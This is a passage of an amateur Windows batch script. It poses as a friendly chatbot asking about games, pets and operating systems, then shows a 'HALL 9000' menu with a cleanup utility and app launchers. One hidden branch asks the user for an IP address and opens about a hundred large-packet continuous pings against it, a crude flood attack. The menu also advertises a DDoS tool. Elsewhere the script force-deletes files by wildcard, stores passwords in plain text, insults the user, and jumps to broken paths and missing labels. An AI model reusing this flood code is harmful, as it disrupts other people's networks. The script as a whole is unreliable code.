if %emotion%== fine goto fine

:fine
color 03
echo.
echo whell thats good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:amaechoing
color 06
echo.
echo thats wonderfull,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:great
color 2
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:loot
echo.
echo I love borderlands 
echo its a wonderfull looting game
echo i love looting games
echo do you like them too?
set /p looter=
if %looter%== yes goto loveyou
if %looter%== no goto understand

:loveyou
echo.
echo I love you dude
echo Its like speaking to myself
echo but we can talk about it later
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:understand
echo.
echo why are you playing borderlands then
echo never mind,i dont need to know
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:fucked
echo.
echo you still play that shit %name%?
set /p answer=
if %answer%== yes goto bad4u
if %answer%== no goto good4u

:me2
echo.
echo good,i liket that game too
echo now,whats your favorite csgo team?
set /p topic=
if %topic%== cloud9 goto yay
if %topic%== envyus goto nay

:bad4u
echo.
echo your a pease of shit
echo i dont want to talk to you anymore
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:good4u
echo.
echo fewh,i though you still played it
echo now we can continue our conversation
echo do you have a pet?
set /p pet=
if %pet%== yes goto metwo
if %pet%== no goto whynot

:yay
echo.
echo thats a great one i like it too
echo but i need to go now
echo bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:nay
echo.
echo thats great
echo i dont like them though
echo i need to go now
echo bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:metwo
echo.
echo thats great i have one too
echo is it a dog or cat or other?
set /p animal=
if %animal%== dog goto dogs
if %animal%== cat goto cats
if %animal%== other goto else

:whynot
echo.
echo whell thats too bad for you
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:good
color 3
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:mobagame
echo.
echo oh i know that one but i have never played it
echo can you excplain what type of game it is
set /p mobaexplained=
if %mobaexplained%== yes goto mobaexplained1
if %mobaexplained%== no goto explanation2
if %rollplaying1%== shure goto explanation1
if %rollplaying1%== nope goto explanation2

:mobaexplained1
echo.
echo so what is it?
set /p exposed=
if %exposed%==moba goto thanks

:many
echo.
echo Many people play that game in my class
echo but i dont like it
echo just one thing
echo can you excplain what RP means in samp?
set /p rollplaying1=
if %rollplaying1%== shure goto explanation1
if %rollplaying1%== nope goto explanation2
if %rollplaying1%== yes goto explanation1
if %rollplaying1%== nope goto explanation2

:explanation1
echo.
echo so what is it?
set /p rpa=
if %rpa%== rollplaying goto thanks

:explanation2
echo.
echo whell fuck you then
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoob

:thanks
echo.
echo thanks for excplaining but i need to go
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:lier
echo.
echo why are you lying to me
echo i dont whant to talk to you anymore
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoob

:bad
color 4
echo.
echo sorry too hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:Sad 
color 5
echo.
echo veary sorry to hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:dogs
echo.
echo mine is a dog too
echo i love dogs
echo i think you might too
echo we can talk later,ok?
set /p then=
if %then%== ok goto badboy
if %then%== no goto whelltoobad

:cats
echo. I hate cats
echo.i dont want to talk to you
echo.bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:else
echo.
echo whell you can tell me about it latter
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:badboy
echo.
echo whait,i changed my mind.
echo we can still talk
echo heres a nother question
echo whats your favorite browser
set /p browser=
if %browser%== googlechrome goto browser
if %browser%== moechoila goto bowser

:browser
echo.
echo thats my favorite one too
echo now,what operating system do you use?
set /p os=
if %os%== windows10 goto os1
if %os%== windows8 goto os2
if %os%== windows7 goto os3
if %os%== ios goto os4
if %os%== linux goto os5
if %os%== android goto os6
if %os%== osx goto os7

:bowser
echo.
echo many people like that one but i dont like it
echo now,what operating system do you use?
set /p os=
if %os%== windows10 goto os1
if %os%== windows8 goto os2
if %os%== windows7 goto os3
if %os%== ios goto os4
if %os%== linux goto os5
if %os%== android goto os6
if %os%== osx goto os7

:os1
echo. 
echo whell i use that one too
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os2
echo. 
echo why are you still using that
echo the windows 10 upgrade was free
echo and windows 10 is way batter than 8
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os3
echo. 
echo whell i used to use that one too
echo but now i upgraded to windows10 wich was free
echo and its way better
echo but it is your dicition
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os4
echo. 
echo i asked for computer not mobile
echo oh and we have a apple user here 
echo yay
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os5
echo. 
echo whell either your a hacker or veary old and dont know anything about computers
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os6
echo. 
echo i asked for computer os not phone
echo oh and btw nice choice i use that one too
echo its veary good
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os7 
echo. 
echo fucking osx,you use apple software on a computer
echo you do know that windows is the way to go with computers
echo the phone side is diferant
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:finnaly1
echo.
echo really,you know him
echo whell if you do tell him this
echo hes one good of a program maker 
echo hes the one that made me
echo and now for real will be saying goodbye to eachother
echo thanks for having this coversation with me
echo i love you for talking to me
echo for now bye and will see eachother later
set /p goodbyeforever=
if %goodbyeforever%== goodbye goto b2

:finnaly2
echo.
echo too bad, you lied to me!!! TTYL!!!
echo i will talk to you soon right?
set /p what=
if %what%==yes goto delete
if %what%==no goto delete
goto delete

:finnaly3
echo.
echo welcome my master
echo welcome to the matrix
echo where you can have all knowladge that has ever excisted
echo welcome to the deep web
start https://www.torproject.org/download/download
echo bye for now
set /p goodbyeforever=
if %goodbyeforever%== goodbye goto b2 

:finnally4
echo.
echo what is your ip addres?
set /p ipaddress=
echo is this right? %ipaddress%
echo if its right type in yes
set /p answer=
if %answer%== yes goto answeripconfig
if %answer%== no goto finally4

:answeripconfig
echo.
echo thank you for your ip
echo bye
set /p goodbye=
if %goodbye%== bye goto celcius

:celcius
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000

set /p gitrekt=
if %gitrekt%== nooo goto delete

:delete
color 0D
echo.
echo ok,chow!!!
echo {0A}%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto random

:random
color 0A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto werdy 
:werdy
color 2A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%  %random%
goto random

:b2
echo bye
set /p b21=
if %b21%== bye goto cls
echo
echo
echo
cls

:cls123
cls
pause

:cls
cls

:adminacc
echo.
echo ========================================
echo H A L L 9 0 0 0   P R O    E D I T I O N
echo ========================================
echo administrator privilege active
echo please insert a command number
echo standard mode (1)
echo advanced mode (2)
set /p enter1=ENTER:
if %enter1%== 1 goto hl9k
if %enter1%== 2 goto advancedmd

:advancedmd
title PC Cleanup Utility http://www.youtube.com/user/techki-tv
goto menu2
:menu2
cls
echo --------------------------------------------------------------------------------
echo PC Cleanup Utility
echo --------------------------------------------------------------------------------
echo.
echo Select a tool
echo =============
echo.
echo [1] Delete Internet Cookies
echo [2] Delete Temporary Internet Files
echo [3] Disk Cleanup
echo [4] Disk Defragment
echo [5] Exit
echo.
set /p op=Run:
if %op%==1 goto 1
if %op%==2 goto 2
if %op%==3 goto 3
if %op%==4 goto 4
if %op%==5 goto exit
goto error
:1
cls
echo --------------------------------------------------------------------------------
echo Delete Internet Cookies
echo --------------------------------------------------------------------------------
echo.
echo Deleting Cookies...
ping localhost -n 3 >nul
del /f /q "%userprofile%\Cookies\*.*"
cls
echo --------------------------------------------------------------------------------
echo Delete Internet Cookies
echo --------------------------------------------------------------------------------
echo.
echo Cookies deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto menu2

:2
cls
echo --------------------------------------------------------------------------------
echo Delete Temporary Internet Files
echo --------------------------------------------------------------------------------
echo.
echo Deleting Temporary Files...
ping localhost -n 3 >nul
del /f /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
cls
echo --------------------------------------------------------------------------------
echo Delete Temporary Internet Files
echo --------------------------------------------------------------------------------
echo.
echo Temporary Internet Files deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto menu2

:3
cls
echo --------------------------------------------------------------------------------
echo Disk Cleanup
echo --------------------------------------------------------------------------------
echo.
echo Running Disk Cleanup...
ping localhost -n 3 >nul
if exist "C:\WINDOWS\temp"del /f /q "C:WINDOWS\temp\*.*"
if exist "C:\WINDOWS\tmp" del /f /q "C:\WINDOWS\tmp\*.*"
if exist "C:\tmp" del /f /q "C:\tmp\*.*"
if exist "C:\temp" del /f /q "C:\temp\*.*"
if exist "%temp%" del /f /q "%temp%\*.*"
if exist "%tmp%" del /f /q "%tmp%\*.*"
if not exist "C:\WINDOWS\Users\*.*" goto skip
if exist "C:\WINDOWS\Users\*.zip" del "C:\WINDOWS\Users\*.zip" /f /q
if exist "C:\WINDOWS\Users\*.exe" del "C:\WINDOWS\Users\*.exe" /f /q
if exist "C:\WINDOWS\Users\*.gif" del "C:\WINDOWS\Users\*.gif" /f /q
if exist "C:\WINDOWS\Users\*.jpg" del "C:\WINDOWS\Users\*.jpg" /f /q
if exist "C:\WINDOWS\Users\*.png" del "C:\WINDOWS\Users\*.png" /f /q
if exist "C:\WINDOWS\Users\*.bmp" del "C:\WINDOWS\Users\*.bmp" /f /q
if exist "C:\WINDOWS\Users\*.avi" del "C:\WINDOWS\Users\*.avi" /f /q
if exist "C:\WINDOWS\Users\*.mpg" del "C:\WINDOWS\Users\*.mpg" /f /q
if exist "C:\WINDOWS\Users\*.mpeg" del "C:\WINDOWS\Users\*.mpeg" /f /q
if exist "C:\WINDOWS\Users\*.ra" del "C:\WINDOWS\Users\*.ra" /f /q
if exist "C:\WINDOWS\Users\*.ram" del "C:\WINDOWS\Users\*.ram"/f /q
if exist "C:\WINDOWS\Users\*.mp3" del "C:\WINDOWS\Users\*.mp3" /f /q
if exist "C:\WINDOWS\Users\*.mov" del "C:\WINDOWS\Users\*.mov" /f /q
if exist "C:\WINDOWS\Users\*.qt" del "C:\WINDOWS\Users\*.qt" /f /q
if exist "C:\WINDOWS\Users\*.asf" del "C:\WINDOWS\Users\*.asf" /f /q

:skip
if not exist C:\WINDOWS\Users\Users\*.* goto skippy /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.zip del C:\WINDOWS\Users\Users\*.zip /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.exe del C:\WINDOWS\Users\Users\*.exe /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.gif del C:\WINDOWS\Users\Users\*.gif /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.jpg del C:\WINDOWS\Users\Users\*.jpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.png del C:\WINDOWS\Users\Users\*.png /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.bmp del C:\WINDOWS\Users\Users\*.bmp /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.avi del C:\WINDOWS\Users\Users\*.avi /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpg del C:\WINDOWS\Users\Users\*.mpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpeg del C:\WINDOWS\Users\Users\*.mpeg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ra del C:\WINDOWS\Users\Users\*.ra /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ram del C:\WINDOWS\Users\Users\*.ram /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mp3 del C:\WINDOWS\Users\Users\*.mp3 /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.asf del C:\WINDOWS\Users\Users\*.asf /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.qt del C:\WINDOWS\Users\Users\*.qt /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mov del C:\WINDOWS\Users\Users\*.mov /f /q

:skippy
if exist "C:\WINDOWS\ff*.tmp" del C:\WINDOWS\ff*.tmp /f /q
if exist C:\WINDOWS\ShellIconCache del /f /q "C:\WINDOWS\ShellI~1\*.*"
cls
echo --------------------------------------------------------------------------------
echo Disk Cleanup
echo --------------------------------------------------------------------------------
echo.
echo Disk Cleanup successful!
echo.
pause
goto menu2

:4
cls
echo --------------------------------------------------------------------------------
echo Disk Defragment
echo --------------------------------------------------------------------------------
echo.
echo Defragmenting hard disks...
ping localhost -n 3 >nul
defrag -c -v
cls
echo --------------------------------------------------------------------------------
echo Disk Defragment
echo --------------------------------------------------------------------------------
echo.
echo Disk Defrag successful!
echo.
pause
goto menu2

:error
cls
echo Command not recognized.
ping localhost -n 4 >nul
goto menu2

:exit2
echo Thanks for using PC Cleanup Utility by Ryan
echo all credits reserved to Ryan
ping 127.0.0.1 >nul)
echo =======================
echo   W  E  L  C  O  M  E
echo =======================
echo login         (1)
echo register      (2)
echo administrator (3)
echo continue      (4)
echo exit          (5)
set /p userin1=ENTER:
if %userin1%== 1 goto begin1
if %userin1%== 2 goto newuser
if %userin1%== 3 goto login2
if %userin1%== 5 goto exit 
if %userin1%== 4 goto hl9ks
goto start1

:newuser2
set /p userin4=Please insert your Username:
set /p userin5=Please enter your Password:
echo %userin4%>ficou.txt
echo %userin5%>ficop.txt
cls

:login2
set /p userin6=<ficou.txt
set /p userin7=<ficop.txt
set /p userin8=Username:
set /p userin9=Password:
if %userin8%==%userin6% goto password2
if not %userin8%==%userin6% goto begin1
:password2
if %userin9%==%userin7% goto adminacc
if not %userin9%==%userin7% goto begin1

:newuser
set /p userin4=Please insert your Username:
set /p userin5=Please enter your Password:
echo %userin4%>username.txt
echo %userin5%>password.txt
goto begin1

:begin1
set /p userin2=<username.txt
set /p userin3=<password.txt
set /p userin4=Username:
set /p userin5=Password:
if %userin4%==%userin2% goto password
if not %userin4%==%userin2% goto begin1
:password
if %userin5%==%userin3% goto begin2
if not %userin5%==%userin3% goto begin1

:begin2
cls
echo ===============================
echo   WELCOME %userin4% WELCOME
echo ===============================
echo.
echo choose command:
echo continue  (1)
echo customise (2)
echo exit      (3)
set /p cmd=ENTER:
if %cmd%== 1 goto hl9k
if %cmd%== 2 goto colorhl9k
if %cmd%== 3 goto exit
goto begin2

:colorhl9k
pause
echo please instert the number of the color you want
echo blue   (1)
echo green  (2)
echo yellow (3)
echo purple (4)
echo red    (5)
set /p clrchs=ENTER:
if %clrchs%== 1 goto hl9kB
if %clrchs%== 2 goto hl9kG
if %clrchs%== 3 goto hl9kY
if %clrchs%== 4 goto hl9kP
if %clrchs%== 5 goto hl9kR
goto colorhl9k
 
:hl9ks
pause
echo
echo ==================================
echo   H A L L 9 0 0 0   S I M P L E
echo ==================================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1) music-provides a music player                             
echo (2) skype-opens skype
echo (3) chrome-opens google.com
echo (4) steam-opens steam
echo (5) viber-opens viber
set /p com=command:
if "%com%"=="2" goto skype1
if "%com%"=="3" goto chrome1
if "%com%"=="4" goto steam1
if "%com%"=="5" goto viber1
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9ks
 
:hl9kB
pause
color 03
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam and game launcher
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kB

:hl9kG
pause
color 02
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kG

:hl9kR
pause
color 04
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:      
echo type in "exit" to exit the application
echo type in "back" to go back to login screen 
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kR

:hl9kY
pause
color 06
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kY

:hl9kP
pause
color 05
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kP
 
:hl9k
pause
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
